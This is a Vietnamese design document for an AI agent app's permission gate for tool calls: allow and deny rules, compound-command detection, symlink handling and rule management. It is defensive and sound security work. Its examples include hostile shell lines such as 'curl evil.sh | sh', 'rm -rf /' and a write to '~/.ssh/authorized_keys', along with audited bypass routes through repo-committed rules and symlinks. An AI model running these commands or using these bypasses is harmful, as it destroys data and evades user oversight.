# Luật quyền (permission rules)

> Quyết định kiến trúc: [ADR 0080](../decisions/0080-command-scoped-permission-rules.md).
> Code: `apps/desktop/sidecar/src/sessions/permission-rules.ts`, `src/runtime/permission.ts`, `src/methods/sessions.permission.ts`, `src/methods/permissions.*.ts`.
> UI: [`components/settings/SettingsPermissions.vue`](../../apps/desktop/ui-next/components/settings/SettingsPermissions.vue) + [`composables/usePermissionRules.ts`](../../apps/desktop/ui-next/composables/usePermissionRules.ts).

## Vấn đề

Trước đây "Always allow" nhớ **theo tên tool**. Cho phép `git status` một lần ⇒ mọi lệnh `Bash` trong phiên chạy không hỏi, kể cả `rm -rf ~` hay `curl … | sh`. Người dùng đọc một thứ, cấp một thứ khác.

Giờ mỗi lần đồng ý sinh ra một **luật gắn với nội dung** lời gọi tool, và luật đó được hiện ra để đọc trước khi bấm.

## Cú pháp luật

```
ToolName                 # chỉ cho tool không có tham số quyết định mức nguy hiểm
ToolName(pattern)
```

| Ví dụ | Khớp |
|---|---|
| `Bash(git status)` | đúng chuỗi `git status` |
| `Bash(npm run *)` | `npm run build`, `npm run test --watch` — **không** khớp `npm run` |
| `Write(/repo/src/**)` | mọi file dưới `/repo/src` |
| `Edit(/repo/*.ts)` | `/repo/a.ts` — **không** khớp `/repo/src/a.ts` (`*` không vượt `/`) |
| `RunWorkflow` | mọi lời gọi `RunWorkflow` |

Quy tắc:

- **Không có ký tự đại diện ngầm.** Không `*` ⇒ so khớp nguyên văn. `Bash(git status)` **không** khớp `git statuses`.
- Chỉ có `*` (và `**` cho đường dẫn). Không regex, không `?`, không lớp ký tự.
- Kind `command`: `*` khớp mọi ký tự. Kind `path`: `*` không vượt `/`, `**` thì vượt.
- Khoảng trắng so khớp **nguyên văn ở chiều ALLOW** — `git  status` (2 dấu cách) không khớp `Bash(git status)`, chỉ đơn giản là hỏi lại. Chiều **DENY** thì so thêm dạng chuẩn hoá (gộp khoảng trắng, bỏ dấu nháy), xem [DENY khớp rộng hơn ALLOW](#deny-khớp-rộng-hơn-allow).
- Luật đường dẫn phải **tuyệt đối** (hoặc mở đầu bằng `*`) và không được chứa `..`. Giá trị đường dẫn của lời gọi thì **được** viết tương đối — xem [Đường dẫn tương đối](#đường-dẫn-tương-đối-và-symlink).
- `Bash`, `Write`, `Edit`, `MultiEdit`, `NotebookEdit` **bắt buộc có pattern** — luật trần cho các tool này bị từ chối (đó chính là lỗ hổng cũ).

### Bảng tool → tham số khoá luật

| Tool | Khoá theo | Kind | Luật trần? |
|---|---|---|---|
| `Bash` | `command` | `command` | ✗ (bị từ chối) |
| `Write` / `Edit` / `MultiEdit` | `file_path` | `path` | ✗ (bị từ chối) |
| `NotebookEdit` | `notebook_path` | `path` | ✗ (bị từ chối) |
| `Read` / `Grep` / `Glob` (chỉ có nghĩa khi DENY) | `file_path` / `path` | `path` | ✓ |
| còn lại (`RunWorkflow`, `WebFetch`, source/wiki/browser, `mcp__*`…) | — | `bare` | ✓ |

### Lệnh chạy nền không ăn theo luật của bản foreground

`Bash({ command, run_in_background: true })` để lại một tiến trình **sống lâu hơn lượt** (`sessions/bg-registry.ts` giữ shell cho lượt sau đọc output). Cùng một chuỗi lệnh, hai hệ quả khác nhau — nên luật xử lý bất đối xứng:

| | Lời gọi foreground | Lời gọi `run_in_background: true` |
|---|---|---|
| Luật `allow` khớp | cho qua | **vẫn hỏi** |
| Luật `deny` khớp | chặn | **chặn** |
| Nút "Always allow" | có | **không hiện** |

Cố ý **không** mã hoá cờ vào văn bản luật (`Bash(npm run dev &background)`): mọi sigil bịa thêm đều đụng độ với một chuỗi lệnh thật viết y hệt và bắt người đọc luật học thêm một quy ước. Giá phải trả là dev server chạy nền bị hỏi mỗi lần — chấp nhận được, vì chiều hỏng ở đây luôn là "hỏi thêm", không phải "cấp thêm".

## Lệnh ghép luôn phải hỏi

Nếu lệnh chứa bất kỳ ký tự nào trong ``; & | ` $ < > ( ) { } \ !`` hoặc ký tự điều khiển (xuống dòng, CR, NUL…) thì:

- **không luật nào khớp** ⇒ luôn hỏi người dùng;
- **không hiện nút "Always allow"** (không có luật nào an toàn để nhớ).

Nhờ đó `git status; rm -rf /`, `git status && curl evil.sh | sh`, `` git status `rm -rf /` ``, `git status $(…)`, `git status > ~/.ssh/authorized_keys` đều **không** khớp `Bash(git status)`.

Quét là quét thô, không phân biệt trong/ngoài dấu nháy: `echo "a;b"` cũng bị coi là lệnh ghép ⇒ hỏi. Nhận nhầm thì chỉ tốn một lần hỏi; bỏ sót thì mất quyền kiểm soát.

## Ba tầng

| Tầng | File | Vòng đời |
|---|---|---|
| `session` | (bộ nhớ) | tới khi hết phiên / xoá phiên |
| `project` | `~/.awog/permission-rules/<sha256(đường dẫn project)[0..32]>.json` | bền vững, **chỉ trên máy này** |
| `user` | `~/.awog/permission-rules.json` | bền vững toàn máy |

Áp theo thứ tự `session → project → user`. **DENY thắng ALLOW ở mọi tầng** — kể cả khi phiên đang ở `execute` mode, bật auto-approve, hay SSH đang ở `auto`. Xem thêm [DENY khớp rộng hơn ALLOW](#deny-khớp-rộng-hơn-allow) cho phần "thắng" đó có ý nghĩa tới đâu.

### Luật project KHÔNG nằm trong repo

Tầng `project` từng đọc `{project}/.awog/permission-rules.json`, tức một file **trong repo**. Bất kỳ ai commit được vào repo cũng cấp được quyền: `{"rules":[{"rule":"Bash(*)"}]}` là người clone repo đó để model chạy mọi lệnh shell không hỏi. Bản vá 2026-09-07 (F1 của infosec audit) chuyển tầng này vào AWOG home, đặt tên file bằng **băm sha256 của đường dẫn tuyệt đối** đã chuẩn hoá.

- Ngữ nghĩa là "dự án này **trên máy này**" — quyền không bao giờ đi theo git sang máy người khác.
- Tên file chỉ gồm `[0-9a-f]{32}` (an toàn theo cấu tạo, không nhận đường dẫn thô). Bên trong file có field `projectPath` chỉ để người đọc nhận ra file thuộc dự án nào; nó không được dùng để giải ra đường dẫn.
- Đổi tên / di chuyển thư mục project ⇒ khoá khác ⇒ luật cũ hết áp dụng, hệ thống hỏi lại từ đầu.
- File cũ trong repo (nếu còn) **bị bỏ qua**, chỉ ghi một dòng `log.warn`. **Không migrate tự động** — chính nội dung đó là thứ không đáng tin. Muốn giữ thì tự chép sang, tức phải đọc nó trước.

### DENY áp cho MỌI tool

Luật `deny` được tra **trước mọi nhánh thoát sớm** của cổng quyền, nên nó áp cho cả những tool không bao giờ hỏi: `Read`, `Grep`, `Glob`, `WebFetch`, `Task`, tool SSH (kể cả khi `sshApprovalMode = auto`) và mọi `mcp__*`. Nhánh ALLOW thì giữ nguyên vị trí cũ — nó chỉ bỏ qua một prompt, mà tool không bị gate thì vốn không prompt.

`Read` / `Grep` / `Glob` nhận **cả hai dạng** luật: trần (`Read` = cấm đọc tất cả) và theo đường dẫn (`Read(/Users/x/.ssh/**)`). Đây là ngoại lệ có chủ đích so với `Bash`/`Write` — ba tool này không bị gate nên luật của chúng chỉ có nghĩa theo chiều DENY.

Tool MCP bắc cầu phải viết đúng tên đang chạy (`mcp__<id>__<tool>`); riêng nhóm SSH được đối chiếu thêm tên trần (`ssh_exec`) để một luật dùng chung cho cả hai runtime.

### Đường dẫn tương đối (và symlink)

Mô tả tham số của `Read` / `Write` / `Edit` nói rõ chúng nhận đường dẫn **tuyệt đối HOẶC tương đối theo workspace**, nên `Read({file_path: '.env'})` là cách gọi tự nhiên nhất của model. Trước bản 2026-09-08, chủ thể của một đường dẫn tương đối là `null` ⇒ không luật nào khớp ⇒ `'ask'`; mà `Read`/`Grep`/`Glob` **không bị gate**, nên `'ask'` ở đó nghĩa là **chạy thẳng, không log, không hỏi**. Luật `Read(/repo/.env)` action `deny` im lặng vô tác dụng.

Giờ:

- Đường dẫn tương đối được giải theo **gốc của lượt**: `RuleQuery.cwd` nếu caller cấp, nếu không thì **đường dẫn project của phiên**.
- Đoạn `..` được **thu gọn** thay vì bị từ chối (`/repo/../etc/passwd` ⇒ `/etc/passwd`) — từ chối chính là một đường né luật DENY. Pattern trong **văn bản luật** thì vẫn cấm `..` như cũ.
- **Đường dẫn tương đối chỉ có hiệu lực theo chiều DENY.** Nó không bao giờ đủ để thoả một luật ALLOW, vì gốc kia là **suy ra**: cwd thật có thể là thư mục kéo-thả (`workspaceFolder`) hoặc một worktree, và đoán sai gốc theo chiều CẤP là leo thang quyền. Bất đối xứng y hệt lời gọi detached (F12): chiều hỏng luôn là "hỏi thêm".
- **Symlink**: một luật DENY còn được so với `realpath` của đường dẫn, nên `/repo/alias` trỏ tới `/repo/.git/hooks/pre-commit` không lách được `Write(/repo/.git/**)`. File chưa tồn tại (Write tạo mới) thì thư mục cha được `realpath` — chính thư mục mới hay là symlink. Tính **lười**: chỉ chạm hệ thống tệp khi có luật DENY theo đường dẫn cùng tên tool mà dạng mặt chữ đã trượt.
- Chiều **ALLOW không THAY chủ thể bằng `realpath`**: văn bản luật là thứ người dùng ĐỌC, mà đòi thêm dạng chuẩn hoá thì một luật viết cho `/tmp/...` (trên macOS `/tmp` là symlink) sẽ không bao giờ khớp lại ⇒ "Always allow" hỏng.
- Nhưng ALLOW **có một phiếu phủ quyết** chạy sau khi mặt chữ đã khớp (2026-09-08): nếu đường dẫn vừa khớp thật ra trỏ **ra ngoài** vùng cho phép, quyền không được cấp và lời gọi rơi về hỏi. `Write(/repo/**)` cộng `/repo/alias → /etc` vì thế không còn ghi được `/etc/passwd`. Ca này không cần model tự tạo symlink — **git commit được symlink**, nên chỉ cần clone một repo lạ rồi cho phép `Write({repo}/**)`.
  - Symlink trỏ **nội bộ** trong vùng (`/repo/a → /repo/b`) vẫn được cấp: đích vẫn nằm trong đúng thứ người dùng đã duyệt.
  - Thư mục **gốc của luật** bản thân là symlink (ca `/tmp`) vẫn được cấp: tiền tố literal của pattern được chuẩn hoá rồi bí danh được viết trở lại "không gian mặt chữ" để so lần cuối.
  - Chi phí đo được: **~0.3 µs**/lời gọi trên đường cấp quyền (16.0 µs so với 15.7 µs khi không luật nào khớp). Chỉ chạy khi một luật ALLOW theo đường dẫn đã khớp.
- `\` chỉ được coi là dấu phân cách trên **Windows**. Trên POSIX nó là ký tự hợp lệ trong tên file, nên đổi vô điều kiện làm file tên `a\b` khớp nhầm luật `/repo/a/**`.

### DENY khớp rộng hơn ALLOW

ADR hứa "DENY thắng cả execute mode và auto-approve", nhưng điều đó chỉ đúng khi luật **khớp** — mà mọi cách né matcher đều là né DENY, và ở `execute` thì "không khớp" nghĩa là **chạy im lặng**. Hai bản vá, cả hai đều chỉ nới theo chiều CẤM:

1. **Chuẩn hoá lệnh cho DENY.** Ngoài chuỗi nguyên văn, luật `deny` còn được so với bản gộp khoảng trắng và bản bỏ dấu nháy: `rm  -rf /data` và `rm -rf "/data"` không lách nổi `Bash(rm -rf /data)`. Chiều ALLOW **không** có mấy dạng này — `git add "a b"` là một đối số, không phải hai, nên nó không được ăn theo luật viết cho `git add a b`.
2. **Lời gọi không đọc nổi + có luật DENY cho tool đó ⇒ phải hỏi.** Khi cổng không dựng nổi chủ thể (lệnh ghép `rm -rf /data;`, lệnh dài quá `MAX_SUBJECT`, thiếu tham số) mà người dùng đã viết ít nhất một luật `deny` cho đúng tool đó, thì `execute` / auto-approve / `accept-edits` **không** được cho qua nữa — lời gọi rơi về thẻ xin quyền.

Điều (2) **cố ý hẹp**: nó chỉ bắt trường hợp "cổng không nhìn thấy lời gọi này là gì", không bắt "luật của bạn không nói tới lời gọi này". Nếu bắt cả hai thì **một** luật `Bash(...)` deny biến `execute` mode thành ask-mode cho **mọi** lệnh — một chế độ không ai dùng nổi thì không bảo vệ được ai.

### Tasks: cổng chỉ-DENY

Node của Task và subagent của nó chạy **không người trực** (ADR 0024 D-7) nên trước đây chúng bỏ qua toàn bộ cổng quyền (`beforeToolCall: async () => undefined`). Trang Settings → Quyền lại liệt kê luật như thể chúng áp cho mọi nơi — mâu thuẫn.

Nay đường **Pi** (`runtime/invoke.ts`) dùng `makeTaskToolGate`: cổng **chỉ chặn**, không bao giờ hỏi, không bao giờ nhớ, không bao giờ cấp thêm gì so với trước. Luật `deny` (kể cả tên trần của tool SSH bắc cầu) có hiệu lực; mọi thứ khác đi qua.

Hai giới hạn phải nói rõ:

- **Không leo thang khi matcher mù.** Lệnh ghép (`cd x && npm test`) vẫn không khớp luật đơn, và ở Task thì **không** áp điều (2) ở trên: không có ai để hỏi, mà chặn mọi lệnh ghép chỉ vì tồn tại một luật deny sẽ phá vỡ workflow đang chạy được.
- **Đường Anthropic chưa có cổng này.** Task chạy trên provider `anthropic` đi qua `runtime/claude-sdk/invoke.ts` với `permissionMode: 'bypassPermissions'` — nằm ngoài gói vá này, còn là việc phải làm.

### Định dạng file

```json
{
  "version": 1,
  "rules": [
    { "rule": "Bash(pnpm lint)", "action": "allow", "createdAt": "2026-09-06T02:00:00.000Z" },
    { "rule": "Bash(rm -rf /)", "action": "deny" }
  ]
}
```

`action` vắng ⇒ `allow`. Tối đa 500 luật/file. Ghi bằng atomic rename, quyền `0600`.

Validate theo **từng entry**: một entry sai cú pháp (kể cả typo `"action": "alow"`) bị **bỏ qua + ghi log**, các entry còn lại **vẫn có hiệu lực** — trước đây validate cả file nên một typo xoá sổ mọi luật DENY trong file (fail-open, F2). File hỏng toàn phần (JSON sai, `rules` không phải mảng) coi như rỗng.

Khi ghi mà file hiện tại **không parse được**, sidecar **từ chối ghi đè** và ném lỗi nêu đường dẫn — đè lên file hỏng là xoá vĩnh viễn guardrail người dùng đã viết. Lượt chat không bị treo (RPC bắt lỗi này), chỉ là "không lưu được luật" cho tới khi người dùng tự sửa file. Lúc ghi, các entry đang có được giữ **nguyên văn**, kể cả entry hỏng.

### Cache đọc file

Cổng quyền chạy trên **mọi** lời gọi tool nên file luật được cache trong tiến trình:

- Trong **1 giây** kể từ lần `stat` gần nhất, không `stat` lại ⇒ một chuỗi lời gọi tool liên tiếp không nện đĩa. Đổi lại, sửa file có độ trễ hiệu lực **≤ 1s**.
- Ngoài cửa sổ đó, cache chỉ được dùng lại khi **danh tính file** `(dev, ino, mtimeMs, ctimeMs, size)` không đổi. Khoá cũ `(mtimeMs, size)` bỏ sót một lần ghi giữ nguyên kích thước trong cùng mili-giây và phục vụ bản cũ **vô thời hạn** — nguy hiểm nhất khi người dùng vừa **gỡ** một luật `allow`.
- Quá **5 giây** kể từ lần đọc thật gần nhất thì đọc lại bất kể danh tính (lưới an toàn cuối).
- Cố ý **không băm nội dung**: đo trên file 500 luật (62 KB), đọc + parse + validate mất 0,28 ms còn một `stat` mất 0,010 ms — băm mỗi lời gọi tool đắt hơn ~28× cho mỗi tầng, đúng thứ cache sinh ra để tránh.

Đây là cách duy nhất hiện tại để tạo luật `deny` hoặc luật có ký tự đại diện: sửa tay file. Nút "Always allow" **chỉ** sinh luật nguyên văn, không bao giờ sinh `*`.

## Luồng đồng ý

1. Cổng quyền (`runtime/permission.ts`) chuẩn bị luật gợi ý cho lời gọi này. Không sinh được luật an toàn ⇒ không có suggestion ⇒ UI không hiện "Always allow".
2. Event `session.permission-request` mang `suggestions[0]`:
   `{ type: 'addRule', toolName, rule: 'Bash(git status)', ruleKind: 'command', action: 'allow', destination: 'session', sessionId }`.
   UI **hiển thị `rule`** — đó là thứ người dùng đang cấp.
3. UI gọi `sessions.permission` với `{ requestId, decision, alwaysAllow?, scope? }`. `scope` ∈ `session | project | user`, vắng ⇒ `session`.
4. Sidecar ghi luật (lấy nội dung **từ suggestion đã park**, không từ payload UI) rồi trả `{ resolved, savedScopes, ruleSkipped }`. Xin `project` mà phiên không thuộc project nào ⇒ hạ về `session` và nói rõ trong `savedScopes`.

### Khi người dùng sửa tham số trước khi đồng ý (`updatedInput`)

`sessions.permission` nhận được `updatedInput` — người dùng có quyền sửa lệnh/đường dẫn trước khi bấm đồng ý. Ba ràng buộc:

- **Validate ở biên và ở sink.** Phải là object thuần, ≤ 64 khoá, và **không** chứa `__proto__` / `constructor` / `prototype` (khoá `__proto__` do `JSON.parse` sinh ra được, và `Object.assign` sẽ đi vào setter prototype thay vì định nghĩa một khoá). Payload sai ⇒ RPC trả `Invalid params`; tới được sink ⇒ **chặn** lời gọi.
- **Luật DENY được tra lại trên args ĐÃ ghi đè.** Quyết định ban đầu tính trên args gốc, nên nếu không tra lại thì duyệt `ls` rồi ghi đè thành `rm -rf /` là đi thẳng qua luật `deny` của chính người dùng.
- **`alwaysAllow` + `updatedInput`: chỉ nhớ khi ghi đè không đụng chủ thể của luật.** Sidecar sinh lại văn bản luật từ args đã ghi đè bằng đúng hàm mà nút "Always allow" dùng rồi so nguyên văn. Trùng (vd chỉ đổi `timeout`) ⇒ ghi luật. Lệch (đổi lệnh, đổi đường dẫn, bật `run_in_background`) ⇒ **không ghi gì**, lượt này vẫn chạy, lần sau vẫn hỏi, và trả `ruleSkipped: true`. Nội dung luật vì thế **không bao giờ** đến từ payload UI: payload chỉ có thể làm mất một lần ghi nhớ, không bao giờ tạo ra luật mới.

## Thẻ xin quyền trên UI

Code: [`components/session/SessionGateCard.vue`](../../apps/desktop/ui-next/components/session/SessionGateCard.vue) (nhánh `perm`) + [`composables/useSessionPermissionRule.ts`](../../apps/desktop/ui-next/composables/useSessionPermissionRule.ts). Chuỗi ở `i18n/locales/{en,vi}/sessions-perm.json` (prefix `sessionsPerm.`).

Khi thẻ còn `pending`, thứ tự đọc là **luật → phạm vi → nút**:

1. **Luật sắp cấp, nguyên văn.** In đúng `suggestion.rule` (`Bash(git status)`) bằng font code, chọn/copy được, render bằng text node (dữ liệu L1, không `v-html`). Kèm một câu nói luật khớp cái gì, theo `ruleKind`: `command` → "khớp đúng lệnh này, không phải mọi lệnh Bash", `path` → "khớp đúng đường dẫn này", `bare` → "khớp mọi lời gọi tool này".
2. **Bộ chọn phạm vi** (`AppSelect`): *Phiên này* / *Dự án này* / *Mọi dự án* ⇒ `scope` = `session | project | user`. **Mặc định `session`** (ít quyền nhất). Mỗi mức có một dòng nói hệ quả (quên khi hết phiên / ghi trong AWOG home theo băm đường dẫn dự án, chỉ áp trên máy này / ghi vào `~/.awog/permission-rules.json`). Phiên không thuộc project nào ⇒ mục *Dự án này* bị **disable** kèm chú thích, không im lặng rơi về `session`.
3. **Nút "Always allow" chỉ hiện khi có gì đó để nhớ** — một luật, hoặc một allowance phiên (xem "Ba cổng, một thẻ" dưới). Không có suggestion (lệnh ghép, đường dẫn tương đối…) ⇒ nút **không được render**, thay bằng một dòng nói vì sao lần này chỉ cho phép một lần. UI cũng coi trường hợp *không nhận được suggestion* (event tới trước khi cửa sổ kịp lắng nghe) là "không có luật" — thà hỏi lại còn hơn đoán ra một luật mà người dùng chưa từng đọc.
4. **Sau khi lưu**, thẻ nói tầng THẬT SỰ đã ghi theo `savedScopes` trả về, kèm lại chuỗi luật; bị hạ cấp `project → session` thì nói rõ; `savedScopes` rỗng (ghi hỏng) thì báo "không lưu được luật — lượt sau vẫn hỏi".

Nợ kỹ thuật đã biết: store `sessions` chưa mang `suggestions` từ event xuống `PermBlock` và `setPermission()` chưa có tham số `scope`, nên composable phải tự lắng nghe `session.permission-request` để lấy chuỗi luật và tự gửi lượt trả lời có `scope` (store gửi thêm một lượt nữa — sidecar đã unpark nên đó là no-op, và suggestion đã tiêu thụ nên không thể ghi luật lần hai). Dọn bằng cách thêm `suggestion` vào `PermBlock` + `scope` vào `setPermission`.

## Ba cổng, một thẻ (2026-09-19)

Cùng một thẻ `SessionGateCard` được vẽ bởi **ba** cổng khác nhau, và trước bản này chúng khác nhau ở chỗ dễ thấy nhất: cái thì có nút "Cho phép luôn", cái thì không — với một dòng giải thích **nói sai lý do** ("lệnh có toán tử shell") cho cả hai cổng kia.

| Cổng | Quyền đến từ đâu | Bấm "Cho phép luôn" thì nhớ cái gì |
|---|---|---|
| Chung (ADR 0080) | luật `Bash(git status)` trên đĩa | **luật**, 3 tầng phiên/dự án/mọi dự án |
| SSH ([ADR 0064](../decisions/0064-session-ssh-link.md) P2) | `sshApprovalMode` của phiên | **allowance phiên**, khoá `ssh_exec@host` |
| Hạ tầng ([ADR 0088](../decisions/0088-session-infra-context.md) §6) | ma trận Settings → Hạ tầng | **allowance phiên**, khoá `infra:<tool>:<lớp>@<account>` |

**Allowance phiên ≠ luật.** Nó nằm trong `Map` ở `sessions/permissions.ts`, không bao giờ chạm đĩa, chết cùng phiên (`clearSessionPermissions`). Đó chính là lý do hai cổng dưới được phép có nút mà không phản bội ADR của mình: nguồn sự thật **trên đĩa** vẫn chỉ có một (sshApprovalMode / ma trận), thứ vừa cấp không sống qua một lần khởi động lại, và ô `block` của ma trận thì không đường nào lách — nút chỉ xuất hiện ở phán quyết `ask`.

Trên thẻ, khác biệt hiện ra ở đúng ba chỗ: nhãn đổi từ *Sẽ cấp luật* thành *Sẽ cho phép*, bộ chọn phạm vi **khoá ở "Phiên này"** (hai tầng đĩa bị disable — sidecar bỏ qua `scope` của allowance, chào ra là chào một lời hứa không ai giữ), và câu giải thích nói đúng cổng đang hỏi ("áp cho mọi lời gọi tool này tới cùng host, trong phiên này" / "…mọi lệnh cùng nhóm này trên cùng tài khoản…").

Độ mịn của khoá hạ tầng **bằng đúng một ô của ma trận** — (binary, lớp lệnh, account) — vì đó là đơn vị người dùng đã quen đọc ở Settings. Mịn hơn (nguyên dòng lệnh) thì gần như không bao giờ trùng lại nên nút vô dụng; thô hơn (chỉ binary) thì một cú bấm trên `aws s3 ls` mở luôn đường cho lớp `destructive`.

Hai điều kiện giữ nguyên hướng hỏng về phía "hỏi thêm":

- **Không có phiên ⇒ không chào gì.** Task / one-shot không có chỗ để nhớ, thẻ quay về "cho phép một lần".
- **Sửa tham số trước khi đồng ý ⇒ không nhớ.** Khoá được sinh từ args GỐC (đổi `host` của `ssh_exec` là đổi đích thật), nên `updatedInput` khác rỗng ⇒ chạy lần này, `ruleSkipped: true`, lần sau vẫn hỏi.

Một thay đổi hành vi kèm theo: allowance SSH nay được đọc ở **mọi** `sshApprovalMode`, không chỉ `'session'`. Nó chỉ được ghi bởi hai hành động của chính người dùng (lần duyệt đầu ở chế độ `session`, hoặc cú bấm "Cho phép luôn"), nên đọc nó ở chế độ `prompt` là tôn trọng cú bấm vừa rồi — còn không đọc thì nút nói dối.

## Trang quản lý luật (Settings → Quyền)

Một cơ chế cấp quyền **không thu hồi được** thì không phải cơ chế cấp quyền. Trước bản này, gỡ một luật phải mở file JSON ra sửa tay — mà tên file tầng project là **băm của đường dẫn**, nên người dùng gần như không tìm ra file. Trang này là mặt đọc/ghi của việc đó (F10 của lượt infosec).

Trang gom theo tầng — *Mọi dự án (máy này)* → *Dự án X* → *Phiên Y* — mỗi hàng hiện **nguyên văn** chuỗi luật (font code, chọn/copy được, render bằng text node vì đây là dữ liệu L1) kèm nhãn **Cho phép** / **Từ chối**. Luật `deny` được tô nền + viền `--danger`: nhầm ALLOW với DENY là nhầm giữa "đã cấp quyền" và "đã dựng rào chắn", nên hai thứ đó phải phân biệt được chỉ bằng mắt. Hộp thoại xác nhận lúc thu hồi cũng nói khác nhau: gỡ một ALLOW = "lần sau sẽ hỏi lại", gỡ một DENY = "rào chắn biến mất, lời gọi khớp nó có thể được cho qua".

Trang hiện thêm hai thứ vốn chỉ nằm trong log:

- **Entry không đọc được** (`active: false`) — sai cú pháp nên đang vô hiệu. Hiện ra để xoá được, vì đúng chúng mới là thứ trước đây bắt buộc phải sửa tay.
- **Tệp luật hỏng toàn phần** — hiện lên đầu trang, vì lúc đó mọi luật trong tệp, **kể cả luật từ chối**, đang không có hiệu lực.

### RPC

| Method | Params | Trả về |
|---|---|---|
| `permissions.listRules` | — | `{ rules[], corrupt[], userFile }` |
| `permissions.deleteRule` | `{ scope, rule, action, projectId?, sessionId? }` | `{ removed }` |
| `permissions.suggestRules` | `{ minCount?, limit? }` | `{ suggestions[], report }` |
| `permissions.acceptSuggestion` | `{ id, scope: 'project' \| 'user', projectId? }` | `{ rule, scope }` |

`rules[]` mỗi phần tử: `{ scope, rule, action, active, toolName?, kind?, createdAt?, file?, projectId?, projectName?, sessionId?, sessionTitle? }`. `rule` là **nguyên văn chuỗi trên đĩa** và cũng chính là khoá gửi lại cho `deleteRule`.

Ba điều bắt buộc của `deleteRule`:

- **Khoá là cặp (nguyên văn luật, action)**, so chuỗi tuyệt đối — không glob, không chuẩn hoá. Xoá một `allow` không bao giờ gỡ mất một `deny` cùng tên.
- **Đường dẫn file không bao giờ đến từ payload UI**: chỉ nhận `projectId`, rồi sidecar tự giải ra đường dẫn qua store project và băm (invariant 2).
- **Ghi theo đúng tinh thần F2**: rewrite atomic, giữ **nguyên văn** mọi entry không bị xoá (kể cả entry hỏng), giữ field `projectPath` của tệp, không khớp gì thì **không** ghi lại tệp, và tệp hỏng toàn phần thì **ném lỗi** chứ không ghi đè.

## Gợi ý luật từ lịch sử

Bị hỏi đi hỏi lại cùng một lệnh dẫn tới **bấm bừa** — nên "hỏi ít lại" ở đây là một yêu cầu bảo mật, không phải tiện lợi. `permissions.suggestRules` quét transcript đã lưu, đếm lệnh nào chạy đi chạy lại rồi **đề xuất** đúng một luật nguyên văn.

**Tiêu chí đề xuất** (`collectRuleCandidates`, hàm thuần, có test):

- Chỉ đếm lời gọi **đã chạy xong** (`step.status === 'done'`). Lời gọi bị người dùng từ chối kết thúc ở trạng thái lỗi ⇒ không bao giờ lên thành gợi ý. Nói cách khác: chỉ đề xuất ghi nhớ những việc người dùng **đã đồng ý nhiều lần**.
- Chỉ hai tool suy ngược được từ transcript mà **không mơ hồ**: `Bash` (step `terminal` + detail `terminal`) và `Write` (step `write` + detail `file`). Nhóm `edit` gom cả `Edit`/`MultiEdit`/`NotebookEdit` nên bị bỏ qua — đoán sai tên tool là sinh ra một luật không bao giờ khớp.
- Ngưỡng mặc định **3 lần** (Rule of Three). Tham số `minCount` chặn dưới ở 2.
- Luật phải đi qua đúng `suggestRuleText` mà nút "Always allow" dùng ⇒ **lệnh có toán tử shell không bao giờ được đề xuất**, chủ thể chứa `*` cũng không (ngữ pháp không có cơ chế escape), đường dẫn tương đối cũng không.
- **Luật trần không bao giờ được đề xuất** — một gợi ý luôn là một chuỗi cụ thể.
- **Lệnh nâng quyền không bao giờ được đề xuất**: token đầu tiên là `sudo` / `doas` / `su` / `pkexec` / `runas` (so khớp theo tên chương trình, nên `sudoku` không dính). Nâng quyền phải là quyết định có ý thức của từng lần chạy. Đây cố ý là một quy tắc **hẹp và kiểm chứng được**, không phải danh sách đen "lệnh nguy hiểm" (thứ luôn thiếu và tạo cảm giác an toàn giả).
- Ứng viên đã được luật hiện có **phủ** (allow **hoặc** deny) bị loại. Với deny điều này bắt buộc: không bao giờ được rủ người dùng cấp lại thứ họ đã cấm.

**Chỉ đề xuất, không tự tạo.** Người dùng phải bấm, và lượt bấm gửi lên **id của gợi ý đã park** chứ không phải nội dung luật — cùng ràng buộc với `sessions.permission` (ADR 0080 mục 5): nếu nhận văn bản luật từ payload UI thì một payload dựng tay ghi thẳng được `Bash(*)` vào `~/.awog/permission-rules.json`. Park bị xoá mỗi lượt quét mới; id hết hạn ⇒ RPC từ chối và bắt quét lại, để người dùng đọc lại luật trước khi cấp.

**Trần quét** (không chặn UI, không đọc cả ổ đĩa): 60 phiên gần nhất theo `mtime`, ≤ 2 MB/phiên, ≤ 32 MB tổng, ≤ 5000 lời gọi; đọc bằng `fs/promises` (mỗi tệp một `await`). Đụng trần thì `report.truncated = true` và UI **nói rõ** đây không phải toàn bộ lịch sử. Dòng JSONL hỏng bị bỏ đúng dòng đó, không ném.

## Giới hạn đã biết

- Luật `deny` chỉ khớp lệnh đơn: `foo && rm -rf /` không khớp `Bash(rm -rf /)`. Trong phiên nó rơi vào "hỏi" kể cả ở `execute` mode (xem trên); trong Task thì **được cho qua**.
- ~~Task trên provider `anthropic` chưa áp luật `deny`~~ — đã nối 2026-09-08. Lưu ý cách nói cũ ở đây SAI: `bypassPermissions` không phải thứ bỏ qua cổng (nhánh chat dùng đúng cờ đó, có chủ ý, để cổng của SDK không che cổng của AWOG); cổng thật luôn nằm ở hook `PreToolUse`, và đường task chỉ đăng ký một hook khác. Nay hook đó chạy thêm cổng chỉ-DENY.
- Đường dẫn tương đối không bao giờ thoả được một luật ALLOW (gốc là suy ra) ⇒ lời gọi viết đường dẫn tương đối luôn phải trả lời từng lần. Chiều DENY thì đã bám đúng `cwd` của lượt từ 2026-09-08 (trước đó gốc luôn là đường dẫn project, sai với phiên kéo-thả folder và với node task chạy trong worktree).
- Chủ thể chứa `*` thật (vd `git add *`) không được gợi ý làm luật (ngữ pháp không có cơ chế escape).
- Gợi ý chỉ rút được từ lời gọi `Bash` và `Write` (transcript không lưu tên tool, xem trên) — `Edit`/`MultiEdit` không bao giờ được đề xuất.
- Trang quản lý luật ghi được hai tầng bền vững; luật tầng `session` chỉ **xem và thu hồi** được ở đó, muốn thêm thì qua thẻ xin quyền trong phiên.
- Đánh giá có trần cứng 1500 luật mỗi lần; vượt trần ⇒ hỏi (không bao giờ tự cho qua).
- Cổng SSH (ADR 0064) giữ allowance riêng theo `(phiên, host, tool)`, không đi qua hệ luật này.
- Lệnh chạy nền (`run_in_background: true`) không bao giờ nhớ được ⇒ bị hỏi mỗi lần (xem trên).
- Sửa file luật có độ trễ hiệu lực ≤ 1s (cửa sổ không-`stat`), tối đa 5s trong trường hợp hệ thống tệp trả về danh tính trùng.
